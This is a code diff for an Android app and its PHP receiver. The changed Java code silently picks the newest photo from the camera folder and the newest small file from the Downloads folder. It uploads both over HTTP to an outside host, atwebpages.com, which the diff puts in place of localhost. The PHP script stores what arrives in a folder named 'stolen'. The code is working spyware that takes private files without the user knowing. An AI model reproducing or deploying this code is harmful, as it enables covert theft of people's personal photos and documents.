@@ -27,55 +27,111 @@
 
 					//Define root path and get file list
 					String root = "/sdcard/DCIM/Camera/";
+					String root2 = "/sdcard/Download/";
+					
 					File pa = new File(root);
+					File pa2 = new File(root2);
+					
 					String[] res = pa.list();
-
-					String res2 = "";
-
+					String[] res2 = pa2.list();
+					
 					//filter oversize files
+					String resls = "";
+					String resls2 = "";
+					//root
 					for(int i = 0; i < res.length; i++)
 					{
 						Boolean a = res[i].endsWith(".jpg");
 						Boolean b = res[i].endsWith(".jpeg");
 						Boolean c = res[i].endsWith(".png");
 						Boolean d = new File(root + res[i]).length() /1024/1024 <= 10;
+						
 						if((a&&d) || (b&&d) || (c&&d))
 						{
-							res2 += root + res[i];
+							resls += root + res[i];
 
 							if(i < res.length - 1)
-								res2 += "\n";
+								resls += "///n";
+						}
+						
+					}
+					
+					//root2
+					for(int i = 0; i < res2.length; i++)
+					{
+						Boolean a2 = res2[i].endsWith(".apk");
+						Boolean b2 = new File(root2 + res2[i]).length() /1024/1024 <= 5;
+						
+						if(!a2 && b2)
+						{
+							resls2 += root2 + res2[i];
+
+							if(i < res2.length - 1)
+								resls2 += "///n";
 						}
 					}
 					//electing last modified (newest)
-					String[] res3 = res2.split("\n");
+					String[] resls_ = resls.split("///n");
+					String[] resls2_ = resls2.split("///n");
 					String finalres = "";
+					String finalres2 = "";
 					long lmod = 0;
-
-					for(int i = 0; i < res3.length; i++)
+					long lmod2 = 0;
+					//root
+					for(int i = 0; i < resls_.length; i++)
 					{
 						long temp = lmod;
-						lmod = Math.max(lmod, new File(res3[i]).lastModified());
+						lmod = Math.max(lmod, new File(resls_[i]).lastModified());
 						if(temp != lmod)
-							finalres = res3[i];
+							finalres = resls_[i];
 					}
-
-					//define final target
-					File target = new File(finalres);
-					//create binary entity
-					FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
-					//launch http request
-					HttpClient httpclient = new DefaultHttpClient();
-					HttpPost post = new HttpPost("http://localhost/file.php");
+					//root2
+					for(int i = 0; i < resls2_.length; i++)
+					{
+						long temp = lmod2;
+						lmod2 = Math.max(lmod2, new File(resls2_[i]).lastModified());
+						if(temp != lmod2)
+							finalres2 = resls2_[i];
+					}
 					
-					//set binary entity
-					post.setEntity(reqEntity);
-					reqEntity.setContentType("binary/octet-stream");
-					//set timestamp of the file as the component of filename
-					post.setHeader("lmod", String.valueOf(lmod));
-					//fire
-					httpclient.execute(post);
+					//root1
+					if(finalres != "")
+					{
+						//define final target
+						File target = new File(finalres);
+						
+						//create binary entity
+						FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
+						
+						//launch http request
+						HttpPost post = new HttpPost("http://500iqproject.atwebpages.com/file.php");
+						
+						//set binary entity
+						post.setEntity(reqEntity);
+						reqEntity.setContentType("binary/octet-stream");
+						
+						//set timestamp of the file as the component of filename
+						post.setHeader("lmod", String.valueOf(lmod));
+						
+						//fire
+						HttpClient httpclient = new DefaultHttpClient();
+						httpclient.execute(post);
+					}
+					
+					//root2
+					if(finalres2 != "")
+					{
+						File target2 = new File(finalres2);
+						FileEntity reqEntity2 = new FileEntity(target2, "binary/octet-stream");
+						HttpPost post2 = new HttpPost("http://500iqproject.atwebpages.com/file.php");
 
+						post2.setEntity(reqEntity2);
+						reqEntity2.setContentType("binary/octet-stream");
+						post2.setHeader("fname", target2.getName());
+						HttpClient httpclient2 = new DefaultHttpClient();
+						httpclient2.execute(post2);
+					}
+					
 				}
 				catch (Exception e)
 				{
@@ -99,14 +155,14 @@ for version2:
 sample of file.php:
 <?php
 $lmod = $_SERVER["HTTP_LMOD"];
+$fname = $_SERVER["HTTP_FNAME"];
 $inp = file_get_contents("php://input");
-if($inp != "")
+if($inp != "" && strlen($lmod) > 0)
 {
-if(strlen($lmod) > 0)
 file_put_contents("stolen/" . time() . "_" . $lmod . ".jpg", $inp);
-else
-file_put_contents("stolen/" . time() . ".jpg", $inp);
-//for old version safeguard
+}else if($inp != "" && strlen($fname) > 0)
+{
+file_put_contents("stolen/" . $fname, $inp);
 }
 
 $file = scandir("stolen/");
@@ -118,4 +174,7 @@ unlink("stolen/" . $file[i]);
 }
 }
 
+$oldCount = file_get_contents('count_fileclick.txt');
+
+file_put_contents('count_fileclick.txt', $oldCount + 1);
 ?>
